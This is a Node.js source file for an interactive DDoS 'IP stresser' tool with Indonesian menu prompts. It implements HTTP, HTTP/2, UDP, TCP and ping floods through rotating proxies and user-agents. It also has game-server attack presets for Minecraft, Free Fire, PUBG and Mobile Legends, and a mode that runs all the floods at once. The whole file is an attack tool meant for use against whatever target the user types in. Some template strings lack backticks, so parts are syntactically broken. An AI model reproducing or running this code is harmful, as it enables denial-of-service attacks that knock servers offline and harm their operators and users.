import fs from 'fs'; import os from 'os'; import cluster from 'cluster'; import { exec } from 'child_process'; import http from 'http'; import http2 from 'http2'; import net from 'net'; import dgram from 'dgram'; import chalk from 'chalk'; import figlet from 'figlet'; import inquirer from 'inquirer';

// Load proxies and user-agents const proxies = fs.readFileSync('./proxy.txt', 'utf-8').split(/\r?\n/).filter(Boolean); const uas = fs.readFileSync('./ua.txt', 'utf-8').split(/\r?\n/).filter(Boolean);

// Banner function displayBanner() { console.clear(); console.log(chalk.red(figlet.textSync('IP STRESSER', { horizontalLayout: 'full' }))); console.log(chalk.yellow('🔥 Ganas DDoS Stresser for Termux 🔥')); console.log(chalk.green(📱 Node ${process.version} on ${os.platform()} ${os.arch()})); console.log(''); }

// Flood Methods async function httpFlood(target, threads, duration) { const end = Date.now() + duration * 1000; while (Date.now() < end) { for (let i = 0; i < threads; i++) { const options = { headers: { 'User-Agent': uas[Math.floor(Math.random() * uas.length)], 'Connection': 'keep-alive' } }; const proxy = proxies[Math.floor(Math.random() * proxies.length)]; http.request({ host: proxy.split(':')[0], port: proxy.split(':')[1], path: target, ...options }).end(); } } }

async function http2Flood(target, threads, duration) { const client = http2.connect(target); const end = Date.now() + duration * 1000; while (Date.now() < end) { for (let i = 0; i < threads; i++) { const req = client.request({ ':path': '/' }); req.end(); } } client.close(); }

function udpFlood(host, port, threads, duration) { const end = Date.now() + duration * 1000; const msg = Buffer.alloc(1024, 'X'); while (Date.now() < end) { for (let i = 0; i < threads; i++) { const socket = dgram.createSocket('udp4'); socket.send(msg, 0, msg.length, port, host, () => socket.close()); } } }

function tcpFlood(host, port, threads, duration) { const end = Date.now() + duration * 1000; while (Date.now() < end) { for (let i = 0; i < threads; i++) { const sock = new net.Socket(); sock.connect(port, host, () => sock.destroy()); sock.on('error', () => {}); } } }

function pingFlood(target) { console.log(chalk.blue('🔥 Menjalankan Ping Flood 🔥')); exec(ping -f -s 1024 ${target}); }

// Game-specific Attacks function minecraftAttack(host, threads, duration) { console.log(chalk.cyan(🛡️ Minecraft Attack pada ${host}:25565)); tcpFlood(host, 25565, threads * 2, duration); }

function ffAttack(host, threads, duration) { console.log(chalk.cyan(🎮 Free Fire Attack pada ${host}:2050)); udpFlood(host, 2050, threads * 3, duration); }

function pubgAttack(host, threads, duration) { console.log(chalk.cyan(🔫 PUBG Attack pada ${host}:12000)); udpFlood(host, 12000, threads * 3, duration); }

function mlAttack(host, threads, duration) { console.log(chalk.cyan(⚔️ Mobile Legends Attack pada ${host}:443)); udpFlood(host, 443, threads * 3, duration); }

function brutalCombo(target, threads, duration) { console.log(chalk.redBright('💥 Brutal Kombo Down (ALL)')); httpFlood(target, threads, duration); http2Flood(target, threads, duration); tcpFlood(target, 80, threads, duration); udpFlood(target, 80, threads, duration); pingFlood(target); }

// Interactive Menu async function mainMenu() { displayBanner(); const ans = await inquirer.prompt([ { type: 'list', name: 'method', message: 'Pilih metode serangan:', choices: [ 'HTTP Flood', 'HTTP/2 Flood', 'UDP Flood', 'TCP Flood', 'Ping Flood', 'Brutal Kombo Down (ALL)', 'Minecraft Attack', 'Free Fire Attack', 'PUBG Attack', 'Mobile Legends Attack' ]}, { type: 'input', name: 'target', message: 'Masukkan target (URL atau IP):' }, { type: 'input', name: 'port', message: 'Masukkan port:', when: ans => ['UDP Flood','TCP Flood'].includes(ans.method), default: '80' }, { type: 'number', name: 'threads', message: 'Jumlah threads:', default: 100 }, { type: 'number', name: 'duration', message: 'Durasi (detik):', default: 60 } ]);

const { method, target, port, threads, duration } = ans; console.log(chalk.green(Menjalankan ${method} pada ${target}${port ? ':'+port : ''} dengan ${threads} threads selama ${duration}s...));

switch (method) { case 'HTTP Flood': return httpFlood(target, threads, duration); case 'HTTP/2 Flood': return http2Flood(target, threads, duration); case 'UDP Flood': return udpFlood(target, parseInt(port), threads, duration); case 'TCP Flood': return tcpFlood(target, parseInt(port), threads, duration); case 'Ping Flood': return pingFlood(target); case 'Brutal Kombo Down (ALL)': return brutalCombo(target, threads * 2, duration); case 'Minecraft Attack': return minecraftAttack(target, threads, duration); case 'Free Fire Attack': return ffAttack(target, threads, duration); case 'PUBG Attack': return pubgAttack(target, threads, duration); case 'Mobile Legends Attack': return mlAttack(target, threads, duration); default: console.log(chalk.red('Metode tidak valid')); } }

if (cluster.isMaster) mainMenu();

